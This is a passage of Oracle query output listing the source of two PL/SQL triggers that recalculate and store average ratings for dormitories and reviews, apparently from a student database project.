+CALCULATE_DORMITORY_RATING	    TRIGGER	        25	-- Update the Dormitory table with the calculated average rating
+CALCULATE_DORMITORY_RATING	    TRIGGER	        26	BEGIN
+CALCULATE_DORMITORY_RATING	    TRIGGER	        27	UPDATE Dormitory
+CALCULATE_DORMITORY_RATING	    TRIGGER	        28	SET RATING_SCORE = ROUND(v_avg_rating, 1)
+CALCULATE_DORMITORY_RATING	    TRIGGER	        29	WHERE DORM_ID = :NEW.DORM_ID;
+CALCULATE_DORMITORY_RATING	    TRIGGER	        30	COMMIT;
+CALCULATE_DORMITORY_RATING	    TRIGGER	        31	DBMS_OUTPUT.PUT_LINE('Dormitory rating updated successfully for DORM_ID: ' || :NEW.DORM_ID);
+CALCULATE_DORMITORY_RATING	    TRIGGER	        32	EXCEPTION
+CALCULATE_DORMITORY_RATING	    TRIGGER	        33	WHEN NO_DATA_FOUND THEN
+CALCULATE_DORMITORY_RATING	    TRIGGER	        34	DBMS_OUTPUT.PUT_LINE('No data found for DORM_ID: ' || :NEW.DORM_ID);
+CALCULATE_DORMITORY_RATING	    TRIGGER	        35	WHEN OTHERS THEN
+CALCULATE_DORMITORY_RATING	    TRIGGER	        36	DBMS_OUTPUT.PUT_LINE('Error updating dormitory rating for DORM_ID: ' || :NEW.DORM_ID);
+CALCULATE_DORMITORY_RATING	    TRIGGER	        37	END;
+CALCULATE_DORMITORY_RATING	    TRIGGER	        38	 
+CALCULATE_DORMITORY_RATING	    TRIGGER	        39	EXCEPTION
+CALCULATE_DORMITORY_RATING	    TRIGGER	        40	WHEN OTHERS THEN
+CALCULATE_DORMITORY_RATING	    TRIGGER	        41	DBMS_OUTPUT.PUT_LINE('Trigger error for DORM_ID: ' || :NEW.DORM_ID);
+CALCULATE_REVIEW_RATING	        TRIGGER	        24	DBMS_OUTPUT.PUT_LINE('Review ID: ' || :NEW.REVIEW_ID || ', Total Rating: ' || v_total_rating || ', Num Ratings: ' || v_num_ratings || ', Avg Ratin g: ' || v_avg_rating);
+CALCULATE_REVIEW_RATING	        TRIGGER	        25	 
+CALCULATE_REVIEW_RATING	        TRIGGER	        26	-- Update the Review table with the calculated average rating
+CALCULATE_REVIEW_RATING	        TRIGGER	        27	BEGIN
+CALCULATE_REVIEW_RATING	        TRIGGER	        28	UPDATE Review
+CALCULATE_REVIEW_RATING	        TRIGGER	        29	SET RATING_SCORE = ROUND(v_avg_rating, 1)
+CALCULATE_REVIEW_RATING	        TRIGGER	        30	WHERE REVIEW_ID = :NEW.REVIEW_ID;
+CALCULATE_REVIEW_RATING	        TRIGGER	        31	COMMIT;
+CALCULATE_REVIEW_RATING	        TRIGGER	        32	DBMS_OUTPUT.PUT_LINE('Rating updated successfully for REVIEW_ID: ' || :NEW.REVIEW_ID);
+CALCULATE_REVIEW_RATING	        TRIGGER	        33	EXCEPTION
+CALCULATE_REVIEW_RATING	        TRIGGER	        34	WHEN NO_DATA_FOUND THEN
+CALCULATE_REVIEW_RATING	        TRIGGER	        35	DBMS_OUTPUT.PUT_LINE('No data found for REVIEW_ID: ' || :NEW.REVIEW_ID);
+CALCULATE_REVIEW_RATING	        TRIGGER	        36	WHEN OTHERS THEN
+CALCULATE_REVIEW_RATING	        TRIGGER	        37	DBMS_OUTPUT.PUT_LINE('Error updating rating for REVIEW_ID: ' || :NEW.REVIEW_ID);
+CALCULATE_REVIEW_RATING	        TRIGGER	        38	END;
+CALCULATE_REVIEW_RATING	        TRIGGER	        39	 
+CALCULATE_REVIEW_RATING	        TRIGGER	        40	EXCEPTION
+CALCULATE_REVIEW_RATING	        TRIGGER	        41	WHEN OTHERS THEN
+CALCULATE_REVIEW_RATING	        TRIGGER	        42	DBMS_OUTPUT.PUT_LINE('Trigger error for REVIEW_ID: ' || :NEW.REVIEW_ID);
+CALCULATE_REVIEW_RATING	        TRIGGER	        43	END;
+
+230 row selected.
